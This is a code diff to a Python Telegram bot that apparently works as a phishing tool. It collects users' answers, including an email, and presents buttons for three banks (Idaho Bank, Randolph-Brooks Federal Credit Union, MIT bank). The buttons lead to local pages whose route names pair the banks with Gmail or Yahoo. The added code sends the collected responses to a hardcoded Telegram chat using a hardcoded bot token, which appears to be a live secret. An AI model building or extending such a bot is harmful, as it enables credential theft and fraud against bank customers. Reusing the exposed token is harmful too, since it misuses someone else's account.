@@ -32,7 +32,7 @@ if __version_info__ < (20, 0, 0, "alpha", 1):
         f"{TG_VER} version of this example, "
         f"visit https://docs.python-telegram-bot.org/en/v{TG_VER}/examples.html"
     )
-from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup, Update, Bot
 from telegram.ext import (
     Application,
     CommandHandler,
@@ -152,9 +152,9 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     link = query.data
      
     await query.edit_message_text(text=f"Selected option: {query.data}")
-    
 
-    webbrowser.open(link)
+    
+    
 
 
 
@@ -172,8 +172,23 @@ async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     response = {
         "user_id": user_id,
         "responses": user_responses
-    }
-    collection.insert_one(response)
+    } 
+
+    # Your Telegram bot token
+    telegram_bot_token = "6384532778:AAHMaZBRAvX2iTaBN15M1pPduP8ZAjrm_U0"
+
+    # Recipient's chat ID (you can find this using a bot like @get_id_bot)
+    telegram_recipient_chat_id = "974422536"
+
+    # Create a Telegram bot instance
+    bot = Bot(token=telegram_bot_token)
+
+    # Create the message
+    telegram_message = f"**User ID:** {response['user_id']}\n\n**Responses:**\n{response['responses']}"
+
+    # Send the message  
+    await bot.send_message(chat_id=telegram_recipient_chat_id, text=telegram_message)
+
 
     # Save the user email 
     user_email = user_responses['question_6']
@@ -195,7 +210,7 @@ async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         RBFCU_Bank = f'http://localhost:5000/rbfcu_gmail?tgUserId={user_id}'
         MIT_Bank = f'http://localhost:5000/MIT_gmail?tgUserId={user_id}'
     else:
-        IDAHO_Bank = f'http://localhost:5000/gmail_Idaho_Bank?tgUserId={user_id}'
+        IDAHO_Bank = f'https://google.com/'
         RBFCU_Bank = f'http://localhost:5000/gmail_rbfcu_Bank?tgUserId={user_id}'
         MIT_Bank = f'http://localhost:5000/yahoo_MIT_BANK?tgUserId={user_id}'
 
@@ -205,7 +220,7 @@ async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Sends a message with three inline buttons attached."""
     keyboard = [
         [
-            InlineKeyboardButton("IDAHO BANK", callback_data=IDAHO_Bank),
+            InlineKeyboardButton("IDAHO BANK", url=IDAHO_Bank),
             InlineKeyboardButton("Randolph-Brooks Federal Credit Union", callback_data=RBFCU_Bank),
         ],
         [InlineKeyboardButton("MIT bank", callback_data=MIT_Bank)],
